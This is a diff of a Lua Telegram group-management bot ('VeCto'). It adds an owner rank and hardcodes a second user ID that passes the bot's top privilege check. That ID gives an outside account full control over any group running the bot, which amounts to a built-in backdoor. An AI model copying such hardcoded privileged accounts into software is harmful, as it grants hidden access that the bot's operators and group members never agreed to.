@@ -21,7 +21,7 @@ print("\27[34m"..[[
 >> The Bot is Running
 >> Bot source > VeCto
 >>Source channel > @TeAm_VeCto
->>Source developer > @MmSsDs
+>>Source developer > @mmssds
 
 
 Installation information
@@ -158,6 +158,8 @@ end
 function Rank_Checking(user_id,chat_id)
 if tonumber(user_id) == tonumber(1313703081) then  
 var = true  
+elseif tonumber(user_id) == tonumber(114518657) then
+var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then  
@@ -166,8 +168,8 @@ elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then
 var = true  
 elseif database:sismember(bot_id.."VeCto:Sudo:User", user_id) then
 var = true  
-elseif database:sismember(bot_id.."VeCto:Basic:Constructor"..chat_id, user_id) then
-var = true                 
+elseif database:sismember(bot_id.."creator"..chat_id, user_id) then
+var = true                
 elseif database:sismember(bot_id.."VeCto:Basic:Constructor"..chat_id, user_id) then
 var = true
 elseif database:sismember(bot_id.."VeCto:Constructor"..chat_id, user_id) then
@@ -194,7 +196,8 @@ elseif tonumber(user_id) == tonumber(bot_id) then
 var = "البوت"
 elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then  var = "المطور الاساسي²"  
 elseif database:sismember(bot_id.."VeCto:Sudo:User", user_id) then
-var = database:get(bot_id.."VeCto:Sudo:Rd"..chat_id) or "المطور" 
+var = database:get(bot_id.."VeCto:Sudo:Rd"..chat_id) or "المطور"  
+elseif database:sismember(bot_id.."creator"..chat_id,user_id) then var = "المالك"
 elseif database:sismember(bot_id.."VeCto:Basic:Constructor"..chat_id, user_id) then
 var = database:get(bot_id.."VeCto:BasicConstructor:Rd"..chat_id) or "المنشئ اساسي"
 elseif database:sismember(bot_id.."VeCto:Constructor"..chat_id, user_id) then
@@ -9032,8 +9035,6 @@ end
 
 
 
-
-
 end ---- Chat_Type = 'GroupBot' 
 end ---- Chat_Type = 'GroupBot' 
 
@@ -9791,6 +9792,7 @@ end
 end --- Chat_Type = 'UserBot' 
 end
 end
+function tdcli_update_callback(data)
 if data.ID == "UpdateNewCallbackQuery" then
 local Chat_id = data.chat_id_
 local From_id = data.id_
